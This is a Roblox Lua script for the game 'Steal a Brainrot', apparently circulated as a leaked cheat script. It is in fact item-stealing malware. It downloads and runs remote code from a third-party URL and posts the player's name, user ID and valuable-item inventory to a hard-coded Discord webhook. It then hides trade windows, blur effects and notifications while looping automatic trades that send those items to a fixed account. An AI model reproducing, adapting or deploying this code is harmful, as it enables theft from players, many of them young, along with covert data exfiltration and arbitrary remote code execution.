-- discord.gg/sabscripts self-leak have fun

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")

task.spawn(function()
loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=k0v6rz9s"))()
end)

task.spawn(function()

local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1496132275690147851/_G_YbxAxwb52wrMgxe7dzsjpAWJCDRn0r2dhfQU54qCpF47-vodQrC0RRX8HbhwvNB2g"
local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TARGET_ID = 10473713528
local DELAY_STEP = 1
local TRADE_CYCLE_DELAY = 2

local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"

local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}

local TargetBrainrots = {
     ["Foxini Lanternini"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["Los Sekolahs"] = true,
    ["Cloverat Clapat"] = true, ["Chillin Chili"] = true, ["Fragola La La La"] = true, ["Cash or Card"] = true,
    ["Hydra Bunny"] = true, ["Bunny and Eggy"] = true, ["Arcadragon"] = true, ["Pancake and Syrup"] = true,
    ["Los Chillis"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Gym Bros"] = true,
    ["Globa Steppa"] = true, ["Dug dug dug"] = true, ["Jolly Jolly Sahur"] = true, ["Gold Gold Gold"] = true,
    ["Fishino Clownino"] = true, ["Sammyni Fattini"] = true, ["Strawberry Elephant"] = true, ["Meowl"] = true,
    ["Headless Horseman"] = true, ["Skibidi Toilet"] = true, ["Griffin"] = true, ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true,
    ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Fragrama and Chocrama"] = true,
    ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true,
    ["Festive 67"] = true, ["Antonio"] = true, ["Garama and Madundung"] = true
}

local GOOD_BRAINROTS = {
    ["Foxini Lanternini"] = true, ["Fortunu and Cashuru"] = true, ["Los Amigos"] = true, ["Los Sekolahs"] = true,
    ["Cloverat Clapat"] = true, ["Chillin Chili"] = true, ["Fragola La La La"] = true, ["Cash or Card"] = true,
    ["Hydra Bunny"] = true, ["Bunny and Eggy"] = true, ["Arcadragon"] = true, ["Pancake and Syrup"] = true,
    ["Los Chillis"] = true, ["Kalika Bros"] = true, ["Digi Narwhal"] = true, ["Gym Bros"] = true,
    ["Globa Steppa"] = true, ["Dug dug dug"] = true, ["Jolly Jolly Sahur"] = true, ["Gold Gold Gold"] = true,
    ["Fishino Clownino"] = true, ["Sammyni Fattini"] = true, ["Strawberry Elephant"] = true, ["Meowl"] = true,
    ["Headless Horseman"] = true, ["Skibidi Toilet"] = true, ["Griffin"] = true, ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true, ["Dragon Cannelloni"] = true, ["Love Love Bear"] = true, ["La Supreme Combinasion"] = true,
    ["Celestial Pegasus"] = true, ["Cerberus"] = true, ["Popcuru and Fizzuru"] = true, ["Rosey and Teddy"] = true,
    ["Capitano Moby"] = true, ["Cooki and Milki"] = true, ["Burguro And Fryuro"] = true, ["Ketupat Bros"] = true,
    ["Reinito Sleighito"] = true, ["Signore Carapace"] = true, ["La Casa Boo"] = true, ["Fragrama and Chocrama"] = true,
    ["La Food Combinasion"] = true, ["Elefanto Frigo"] = true, ["Spooky and Pumpky"] = true, ["Ginger Gerat"] = true,
    ["Festive 67"] = true, ["Antonio"] = true, ["Garama and Madundung"] = true
}

local function getRemote(unobfuscatedName)
    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
    local children = Net:GetChildren()
    for i = 1, #children - 1 do
        local current = children[i]
        local nextFolder = children[i + 1]
        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
            return nextFolder
        end
    end
    return nil
end

local function applyEverythingAfterTargetFound()
    local leftCenter = pg:FindFirstChild("LeftCenter")
    if leftCenter then
        local clone = leftCenter:Clone()
        clone.Name = "LeftCenter_Backup"
        clone.Parent = pg
        leftCenter:Destroy()
    end

    local notifyRemote = getRemote("RE/NotificationService/Notify")
    if notifyRemote then
        pcall(function()
            for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
                connection:Disable()
            end
        end)
    end

    local function handleCam(obj)
        if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
    end
    cam.ChildAdded:Connect(handleCam)
    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end

    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
        cam.FieldOfView = 70
    end)
    cam.FieldOfView = 70

    local function handleGui(obj)
        if guiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
    end
    pg.ChildAdded:Connect(handleGui)
    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
end

local AnimalsData, AnimalsShared, NumberUtils
pcall(function()
    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
end)

local function loadSyncData()
    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
    if not mod then return nil end
    local sync = require(mod)
    local fn = sync.Get
    for i = 1, 15 do
        local s, v = pcall(debug.getupvalue, fn, i)
        if s and type(v) == "table" then return v end
    end
    return nil
end

local SYNC_DATA = loadSyncData()
if not SYNC_DATA then return end

local brainrotQueue = {}
for _, plotData in pairs(SYNC_DATA) do
    if type(plotData) == "table" then
        local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
        if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
            local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
            if type(animalList) == "table" then
                for slotKey, data in pairs(animalList) do
                    if type(data) == "table" and data.Index and TargetBrainrots[data.Index] then
                        table.insert(brainrotQueue, {slotKey = tonumber(slotKey), data = data})
                    end
                end
            end
        end
    end
end

if #brainrotQueue == 0 then return end

applyEverythingAfterTargetFound()

local function formatNumber(n)
    if not n then return "$0/s" end
    local function clean(s) return s:gsub("%.?0+$", "") end
    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
    if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
    if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
    if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
    return "$" .. tostring(math.floor(n)) .. "/s"
end

local function getRequestFn()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

local function toWikiName(displayName)
    local clean = displayName:match("^(.-)%s*%(") or displayName
    return clean:gsub(" ", "_")
end

local function fetchFandomImageUrl(displayName)
    local requestFn = getRequestFn()
    if not requestFn then return nil end

    local wikiName = toWikiName(displayName)
    local url = FANDOM_BASE .. wikiName

    for attempt = 1, 3 do
        local ok, response = pcall(function()
            return requestFn({
                Url = url,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    ["Accept-Language"] = "en-US,en;q=0.5",
                    ["Cache-Control"] = "no-cache"
                },
                Timeout = 10
            })
        end)

        if ok and response and response.StatusCode and response.StatusCode == 200 then
            local body = response.Body
            if not body or body == "" then
                if attempt < 3 then task.wait(0.5) end
                continue
            end

            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
                or body:match('content="([^"]+)"%s+property="og:image"')
                or body:match('<meta%s+og:image%s+content="([^"]+)"')
                or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')

            if ogImage and ogImage ~= "" then
                ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&lt;", "<"):gsub("&gt;", ">")
                if ogImage:find("^https?://") then
                    return ogImage
                end
            end

            local infoboxPattern = '<div[^>]*class="[^"]*infobox[^"]*"[^>]*>(.-)</div>%s*</div>'
            local infoboxMatch = body:match(infoboxPattern)
            local searchBody = infoboxMatch or body

            local imgPatterns = {
                'data%-src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
                'src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
            }

            for _, pattern in ipairs(imgPatterns) do
                local lastMatch = nil
                local pos = 1
                while true do
                    local start, endPos = searchBody:find(pattern, pos)
                    if not start then break end
                    local match = searchBody:sub(start, endPos)
                    local url = match:match('"([^"]+)"')

                    if url and url:find("static%.wikia%.nocookie%.net") then
                        if not url:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
                            lastMatch = url
                        end
                    elseif url then
                        lastMatch = url
                    end
                    pos = endPos + 1
                end

                if lastMatch then
                    lastMatch = lastMatch:gsub("/revision/latest", "")
                    return lastMatch
                end
            end

            return nil
        end

        if attempt < 3 then
            task.wait(0.5 * attempt)
        end
    end

    return nil
end

local function getBrainrotColor(animalIndex)
    local color = nil
    pcall(function()
        local models = ReplicatedStorage:FindFirstChild("Models")
        local animals = models and models:FindFirstChild("Animals")
        if not animals then return end
        local template = animals:FindFirstChild(animalIndex)
        if not template then
            local info = AnimalsData and AnimalsData[animalIndex]
            if info and info.DisplayName then
                template = animals:FindFirstChild(info.DisplayName)
            end
        end
        if not template then return end
        local bestScore = 0
        for _, desc in ipairs(template:GetDescendants()) do
            if desc:IsA("MeshPart") or desc:IsA("Part") then
                local c = desc.Color
                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
                local maxC = math.max(c.R, c.G, c.B)
                local minC = math.min(c.R, c.G, c.B)
                local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
                local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
                local bp = 1
                if bri < 0.08 then bp = 0.05 end
                if bri > 0.92 then bp = 0.15 end
                local score = (sat * 3 + 0.2) * bp * vol
                if score > bestScore then
                    bestScore = score
                    color = c
                end
            end
        end
    end)
    return color
end

local function colorToDecimal(c)
    if not c then return 3447003 end
    local r = math.clamp(math.floor(c.R * 255), 0, 255)
    local g = math.clamp(math.floor(c.G * 255), 0, 255)
    local b = math.clamp(math.floor(c.B * 255), 0, 255)
    return r * 65536 + g * 256 + b
end

local function getBestImageUrl(displayName, animalIndex)
    local fandom = fetchFandomImageUrl(displayName)
    if fandom then return fandom end
    local info = AnimalsData and AnimalsData[animalIndex]
    if info then
        for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId","image","icon"}) do
            if info[key] and type(info[key]) == "string" and info[key] ~= "" then
                local num = info[key]:match("%d+")
                if num then
                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
                end
            end
        end
    end
    if animalIndex and animalIndex ~= displayName then
        local fandom2 = fetchFandomImageUrl(animalIndex)
        if fandom2 then return fandom2 end
    end
    return nil
end

local function sendDetailedWebhook()
    local resultsPrimary = {}
    local requirePingPrimary = false

    for _, plotData in pairs(SYNC_DATA) do
        if type(plotData) == "table" then
            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
            if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
                local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
                if type(animalList) == "table" then
                    for slot, data in pairs(animalList) do
                        if type(data) == "table" and data.Index then
                            local info = AnimalsData and AnimalsData[data.Index]
                            if info then
                                local displayName = info.DisplayName or data.Index
                                local isPrimary = (GOOD_BRAINROTS[displayName] ~= nil)

                                if isPrimary then
                                    local mutation = data.Mutation or "None"
                                    local traits = (data.Traits and #data.Traits > 0) and data.Traits or {}

                                    if GOOD_BRAINROTS[displayName] == true then
                                        requirePingPrimary = true
                                    end

                                    local genVal = 0
                                    pcall(function()
                                        genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
                                    end)
                                    local genStr = formatNumber(genVal)

                                    local mutPrefix = ""
                                    if mutation ~= "None" and mutation ~= "" then
                                        mutPrefix = "[" .. mutation .. "] "
                                    end
                                    local nameDisplay = mutPrefix .. "**" .. displayName .. "**"
                                    if #traits > 0 then
                                        nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
                                    end

                                    table.insert(resultsPrimary, {
                                        slot        = tostring(slot),
                                        index       = data.Index,
                                        displayName = displayName,
                                        name        = nameDisplay,
                                        genVal      = genVal,
                                        genStr      = genStr,
                                    })
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    local function sendToWebhook(resultsList, webhookUrl, ping, avatarUrl)
        if #resultsList == 0 then return end
        table.sort(resultsList, function(a, b) return a.genVal > b.genVal end)

        local requestFn = getRequestFn()
        if not requestFn then return end

        local top = resultsList[1]
        local imageUrl = getBestImageUrl(top.displayName, top.index)
        local topColor = getBrainrotColor(top.index)
        local embedColor = colorToDecimal(topColor)

        local lines = {}
        for i, r in ipairs(resultsList) do
            lines[i] = r.name .. " — **" .. r.genStr .. "**"
        end
        local listText = table.concat(lines, "\n")
        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end

        local unixTime = os.time()
        local pCount = #Players:GetPlayers()
        local execName = "Unknown"
        pcall(function()
            if identifyexecutor then
                execName = identifyexecutor()
            elseif getexecutorname then
                execName = getexecutorname()
            end
        end)

        local embed = {
            title       = top.displayName .. " — " .. top.genStr,
            description = listText,
            color       = embedColor,
            fields      = {
                {
                    name   = "Server",
                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
                    inline = true
                },
                {
                    name   = "Executor",
                    value  = execName,
                    inline = true
                }
            },
            footer      = { text = LP.Name .. " • " .. LP.UserId },
            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }

        if imageUrl then
            embed.thumbnail = { url = imageUrl }
        end

        local payloadData = {
            embeds     = { embed },
            username   = "Scanner",
            avatar_url = avatarUrl,
        }

        if ping then
            payloadData.content = "||@everyone||"
        end

        local payload = HttpService:JSONEncode(payloadData)

        pcall(function()
            requestFn({
                Url     = webhookUrl,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = payload,
            })
        end)
    end

    sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
end

local function startFullAutomation()
    local inviteRemote = getRemote("TradeService/Invite")
    local addRemote    = getRemote("TradeService/AddBrainrot")
    local readyRemote  = getRemote("TradeService/Ready")
    local acceptRemote = getRemote("TradeService/Accept")

    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end

    task.spawn(function()
        local idx = 1
        while true do
            local item = brainrotQueue[idx]
            if item then
                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
                idx = (idx % #brainrotQueue) + 1
            end
            task.wait(DELAY_STEP)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
            task.wait(TRADE_CYCLE_DELAY)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() readyRemote:FireServer(READY_GUID) end)
            task.wait(1)
            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
            task.wait(1)
        end
    end)
end

sendDetailedWebhook()
startFullAutomation()
end)